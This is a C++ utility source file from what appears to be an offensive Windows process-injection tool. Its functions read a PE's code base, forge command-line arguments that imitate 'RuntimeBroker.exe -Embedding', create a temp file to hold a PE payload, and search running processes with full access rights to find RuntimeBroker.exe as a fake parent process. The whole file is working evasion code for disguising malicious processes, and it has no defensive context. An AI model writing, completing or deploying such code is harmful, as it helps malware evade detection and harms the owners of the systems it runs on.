#include "../include/Utils.hpp"


std::uint32_t GetCodeRva(byte* RawFileBuffer) {

	PIMAGE_DOS_HEADER pImgDosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(RawFileBuffer);
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return 0x00;


	PIMAGE_NT_HEADERS pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>\
		(RawFileBuffer + pImgDosHdr->e_lfanew);

	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;


	return pImgNtHdrs->OptionalHeader.BaseOfCode;
}


std::wstring GetFakeCommandLineArguments() {

	wchar_t WindowsDirectory[MAX_PATH] = { 0 };

	if (!GetWindowsDirectoryW(WindowsDirectory, MAX_PATH)) {
		return L"";
	}

	std::wstring ToReturn = WindowsDirectory;
	ToReturn += L"\\System32\\RuntimeBroker.exe -Embedding";

	return ToReturn;
}


std::tuple<HANDLE, std::wstring> CreateTemporaryFile() {

	wchar_t TempDir[MAX_PATH] = { 0 };
	wchar_t FileName[MAX_PATH] = { 0 };
	HANDLE hFile = nullptr;


	std::cout << "[+] Creating temp file to hold the PE..." << std::endl;
	if (!GetTempPathW(MAX_PATH, TempDir)) {
		WIN32_ERR(GetTempPathW);
		return std::make_tuple(INVALID_HANDLE_VALUE, L"");
	}


	if (!GetTempFileNameW(TempDir, L"UR", 0, FileName)) {
		WIN32_ERR(GetTempFileNameW);
		return std::make_tuple(INVALID_HANDLE_VALUE, L"");
	}


	hFile = CreateFileW(
		FileName,
		GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		WIN32_ERR(CreateFileW);
		return std::make_tuple(INVALID_HANDLE_VALUE, L"");
	}


	return std::make_tuple(hFile, FileName);
}


HANDLE EnumerateRuntimeBrokerProcess() {

	uint32_t PidArray[2048] = { 0 };		wchar_t moduleBaseName[250] = { 0 };
	uint32_t sModulebaseName = 0;			uint32_t bytesReturned = 0;
	uint32_t bytesNeeded = 0;			    uint32_t totalNumberOfPids = 0;

	HANDLE hProcess = nullptr;
	HMODULE hModule = nullptr;
	bool foundProcess = false;


	if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
		WIN32_ERR(K32EnumProcesses);
		return nullptr;
	}

	totalNumberOfPids = bytesReturned / sizeof(uint32_t);


	std::cout << "[+] Locating Fake Parent Process..." << std::endl;
	for (size_t i = 0; i < totalNumberOfPids; i++) {

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PidArray[i]);
		if (hProcess == nullptr) {
			continue;
		}

		uint32_t moduleEnumBytesNeeded = 0;
		if (!K32EnumProcessModules(hProcess, &hModule, sizeof(hModule), (LPDWORD)&moduleEnumBytesNeeded)) {
			continue;
		}

		if (!K32GetModuleBaseNameW(hProcess, hModule, moduleBaseName, sizeof(moduleBaseName) / sizeof(wchar_t))) {
			continue;
		}

		if (wcscmp(moduleBaseName, L"RuntimeBroker.exe") == 0) {

			std::cout << "[+] Located RuntimeBroker.exe Parent Process." << std::endl;
			foundProcess = true;
			break;
		}

		memset(moduleBaseName, 0x00, sizeof(moduleBaseName));
	}

	if (!foundProcess) {
		std::cout << "[!] Failed. Current process will be used instead." << std::endl;
	}


	return(foundProcess ? hProcess : nullptr);
}